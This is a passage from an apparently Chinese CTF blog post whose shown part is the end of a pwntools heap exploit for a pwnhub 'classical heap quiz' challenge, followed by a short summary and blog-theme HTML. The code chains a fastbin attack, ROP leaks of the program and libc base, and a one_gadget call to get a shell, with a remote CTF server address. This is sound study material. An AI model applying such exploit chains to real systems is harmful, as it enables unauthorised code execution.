class="number">0</span>)</span><br><span class="line">    py += <span class="string">'\xA9\x4E'</span></span><br><span class="line">    <span class="comment"># debug(0x000DAD)</span></span><br><span class="line">    fastbin_attack(fake_chunk,py)</span><br><span class="line">    rc(<span class="number">11</span>)</span><br><span class="line">    base_addr = u64(rc(<span class="number">8</span>)) - <span class="number">0xeb3</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">"base_addr---&gt;"</span> + hex(base_addr)</span><br><span class="line">    pop_rdi_ret = base_addr + <span class="number">0x1513</span></span><br><span class="line">    pop_rsi_r15_ret = base_addr + <span class="number">0x1511</span></span><br><span class="line">    read_plt = base_addr + elf.sym[<span class="string">"read"</span>]</span><br><span class="line">    write_plt = base_addr + elf.sym[<span class="string">"write"</span>]</span><br><span class="line">    num_addr = base_addr + <span class="number">0x20203C</span></span><br><span class="line">    main_addr = base_addr + <span class="number">0xe66</span></span><br><span class="line">    write_got = base_addr + <span class="number">0x201F88</span></span><br><span class="line"></span><br><span class="line">    py = <span class="string">''</span></span><br><span class="line">    py += <span class="string">'a'</span>*<span class="number">3</span></span><br><span class="line">    py += p64(<span class="number">0</span>)</span><br><span class="line">    py += p64(pop_rdi_ret)</span><br><span class="line">    py += p64(<span class="number">0</span>)</span><br><span class="line">    py += p64(pop_rsi_r15_ret)</span><br><span class="line">    py += p64(num_addr)</span><br><span class="line">    py += p64(<span class="number">0</span>)</span><br><span class="line">    py += p64(read_plt)</span><br><span class="line">    py += p64(main_addr)</span><br><span class="line">    fastbin_attack(fake_chunk<span class="number">-0x20</span>,py)</span><br><span class="line">    sd(<span class="string">'\x00'</span>)</span><br><span class="line"></span><br><span class="line">    ru(<span class="string">"welcome to ziiiro's classical heap quiz\n"</span>)</span><br><span class="line">    py = <span class="string">''</span></span><br><span class="line">    py += <span class="string">'a'</span>*<span class="number">3</span></span><br><span class="line">    py += p64(<span class="number">0</span>)</span><br><span class="line">    py += p64(pop_rdi_ret)</span><br><span class="line">    py += p64(<span class="number">1</span>)</span><br><span class="line">    py += p64(pop_rsi_r15_ret)</span><br><span class="line">    py += p64(write_got)</span><br><span class="line">    py += p64(<span class="number">0</span>)</span><br><span class="line">    py += p64(write_plt)</span><br><span class="line">    py += p64(main_addr)</span><br><span class="line">    fastbin_attack(fake_chunk<span class="number">-0x58</span>,py)</span><br><span class="line"></span><br><span class="line">    libc_base = u64(rc(<span class="number">8</span>)) - libc.sym[<span class="string">"write"</span>]</span><br><span class="line">    onegadget = libc_base + onegadget64[<span class="number">3</span>]</span><br><span class="line">    <span class="keyword">print</span> <span class="string">"libc_base---&gt;"</span> + hex(libc_base)</span><br><span class="line"></span><br><span class="line">    ru(<span class="string">"welcome to ziiiro's classical heap quiz\n"</span>)</span><br><span class="line">    py = <span class="string">''</span></span><br><span class="line">    py += <span class="string">'a'</span>*<span class="number">3</span></span><br><span class="line">    py += p64(<span class="number">0</span>)</span><br><span class="line">    py += p64(onegadget)</span><br><span class="line">    fastbin_attack(fake_chunk<span class="number">-0x90</span>,py)</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">print</span> i</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pwn()</span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        p.close()</span><br><span class="line">        local = <span class="number">1</span></span><br><span class="line">        elf = ELF(<span class="string">'./classic'</span>)</span><br><span class="line">        <span class="keyword">if</span> local:</span><br><span class="line">            p = process(<span class="string">'./classic'</span>)</span><br><span class="line">            libc = elf.libc</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            p = remote(<span class="string">'121.40.246.48'</span>,<span class="number">9999</span>)</span><br><span class="line">            libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sl(<span class="string">"ls"</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="/blog_img/1573216300704.png" alt="57321630070"></p>
+<h5 id="总结：这里学到的新东西是函数调用的理解更清晰了，堆的操作结合栈的操作一起考察，这题质量是真的高，同时意识到pwn和re是不分家的，是时候补补re基础了，多学学加密算法。"><a href="#总结：这里学到的新东西是函数调用的理解更清晰了，堆的操作结合栈的操作一起考察，这题质量是真的高，同时意识到pwn和re是不分家的，是时候补补re基础了，多学学加密算法。" class="headerlink" title="总结：这里学到的新东西是函数调用的理解更清晰了，堆的操作结合栈的操作一起考察，这题质量是真的高，同时意识到pwn和re是不分家的，是时候补补re基础了，多学学加密算法。"></a>总结：这里学到的新东西是函数调用的理解更清晰了，堆的操作结合栈的操作一起考察，这题质量是真的高，同时意识到pwn和re是不分家的，是时候补补re基础了，多学学加密算法。</h5>
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls"
+                data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+            <ul id="audio-list" style="display:none">
+                
+                
+                <li title='0' data-url='/statics/chengdu.mp3'></li>
+                
+                    
+            </ul>
+            
+            
+            
+    <div id='gitalk-container' class="comment link"
+        data-ae='true'
+        data-ci='ec894e2b66f752e8b7fb'
+        data-cs='3ccc2e92bb350688fe2c2dc2930189b62622bfb1'
+        data-r='blog-comments'
+        data-o='TriDiamond'
+        data-a='TriDiamond'
+        data-d=''
+    >Comments</div>
+
+
+            
+            
+        </div>
+        <div class="sidebar">
+            <div class="box animated fadeInRight">
+                <div class="subbox">
+                    <img src="https://res.cloudinary.com/tridiamond/image/upload/v1573019751/TriDiamond_logo_ui_xeublz.jpg" height=300 width=300></img>
+                    <p>V1ct0r</p>
+                    <span>Where there is a will,there is a way！</span>
+                    <dl>
+                        <dd><a href="https://github.com/TriDiamond" target="_blank"><span
+                                    class=" iconfont icon-github"></span></a></dd>
+                        <dd><a href="https://twitter.com/TriDiamond6" target="_blank"><span
+                                    class=" iconfont icon-twitter"></span></a></dd>
+                        <dd><a href="https://stackoverflow.com/users/7602324/tridiamond?tab=profile" target="_blank"><span
+                                    class=" iconfont icon-stack-overflow"></span></a></dd>
+                    </dl>
+                </div>
+                <ul>
+                    <li><a href="/">62 <p>Articles</p></a></li>
+                    <li><a href="/categories">7 <p>Categories</p></a></li>
+                    <li><a href="/tags">59 <p>Tags</p></a></li>
+                </ul>
+            </div>
+            
+            
+            
+            <div class="box sticky animated fadeInRight faster">
+                <div id="toc" class="subbox">
+                    <h4>Contents</h4>
+                    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#一、pwnhub"><span class="toc-number">1.</span> <span class="toc-text">一、pwnhub</span></a></li></ol>
+                </div>
+            </div>
+            
+            
+        </div>
+    </div>
+</div>
+
+    </div>
+</div>
+    <div id="back-to-top" class="animated fadeIn faster">
+        <div class="flow"></div>
+        <span class="percentage animated fadeIn faster">0%</span>
+        <span class="iconfont icon-top02 animated fadeIn faster"></span>
+    </div>
+</body>
+<footer>
+    <p class="copyright" id="copyright">
+        &copy; 2020
+        <span class="gradient-text">
+            V1ct0r
+        </span>.
+        Powered by <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a>
+        Theme
+        <span class="gradient-text">
+            <a href="https://github.com/TriDiamond/hexo-theme-obsidian" title="Obsidian" target="_blank" rel="noopener">Obsidian</a>
+        </span>
+        <small><a href="https://github.com/TriDiamond/hexo-theme-obsidian/blob/master/CHANGELOG.md" title="v1.4.3" target="_blank" rel="noopener">v1.4.3</a></small>
+    </p>
+</footer>
+
+<script type="text/javascript" src="https://cdn.bootcss.com/mathjax/2.7.6/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+<script>
+  MathJax.Hub.Config({
+    "HTML-CSS": {
+      preferredFont: "TeX",
+      availableFonts: ["STIX", "TeX"],
+      linebreaks: {
+        automatic: true
+      },
+      EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
+    },
+    tex2jax: {
+      inlineMath: [
+        ["$", "$"],
+        ["\\(", "\\)"]
+      ],
+      processEscapes: true,
+      ignoreClass: "tex2jax_ignore|dno",
+      skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+    },
+    TeX: {
+      noUndefined: {
+        attributes: {
+          mathcolor: "red",
+          mathbackground: "#FFEEEE",
+          mathsize: "90%"
+        }
+      },
+      Macros: {
+        href: "{}"
+      }
+    },
+    messageStyle: "none"
+  });
+</script>
+<script>
+  function initialMathJax() {
+    MathJax.Hub.Queue(function () {
+      var all = MathJax.Hub.getAllJax(),
+        i;
+      // console.log(all);
+      for (i = 0; i < all.length; i += 1) {
+        console.log(all[i].SourceElement().parentNode)
+        all[i].SourceElement().parentNode.className += ' has-jax';
+      }
+    });
+  }
+
+  function reprocessMathJax() {
+    if (typeof MathJax !== 'undefined') {
+      MathJax.Hub.Queue(["Typeset", MathJax.Hub]);
+    }
+  }
+</script>
+
+
+
+    
+<link rel="stylesheet" href="//cdn.bootcss.com/gitalk/1.5.0/gitalk.min.css">
+
+    
+<script src="//cdn.bootcss.com/gitalk/1.5.0/gitalk.min.js"></script>
+
+
+
+<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/obsidian.js"></script>
+<script src="/js/jquery.truncate.js"></script>
+<script src="/js/search.js"></script>
+
+
+<script src="//cdn.bootcss.com/typed.js/2.0.10/typed.min.js"></script>
+
+
+<script src="//cdn.bootcss.com/blueimp-md5/2.12.0/js/md5.min.js"></script>
+
+
+<script src="//cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>
+
+
+<script src="https://cdn.bootcss.com/codemirror/5.48.4/codemirror.min.js"></script>
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/javascript/javascript.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/css/css.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/xml/xml.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/htmlmixed/htmlmixed.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/clike/clike.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/php/php.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/shell/shell.min.js"></script>
+
+
+    
+<script src="//cdn.bootcss.com/codemirror/5.48.4/mode/python/python.min.js"></script>
+
+
+
+
+    
+<script src="/js/busuanzi.min.js"></script>
+
+    <script>
+        $(document).ready(function () {
+            if ($('span[id^="busuanzi_"]').length) {
+                initialBusuanzi();
+            }
+        });
+    </script>
+
+
+
+<link rel="stylesheet" href="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe.min.css">
+<link rel="stylesheet" href="//cdn.bootcss.com/photoswipe/4.1.3/default-skin/default-skin.min.css">
+
+
+<script src="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe.min.js"></script>
+<script src="//cdn.bootcss.com/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+    <script async src="//www.googletagmanager.com/gtag/js?id=UA-149874671-1"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+
+        gtag('config', 'UA-149874671-1');
+    </script>
+
+
+
+
+
+<script>
+    function initialTyped () {
+        var typedTextEl = $('.typed-text');
+        if (typedTextEl && typedTextEl.length > 0) {
+            var typed = new Typed('.typed-text', {
+                strings: ["Where there is a will,there is a way！", "有志者，事竟成！"],
+                typeSpeed: 90,
+                loop: true,
+                loopCount: Infinity,
+                backSpeed: 20,
+            });
+        }
+    }
+
+    if ($('.article-header') && $('.article-header').length) {
+        $(document).ready(function () {
+            initialTyped();
+        });
+    }
+</script>
+
+
+
+
+</html>
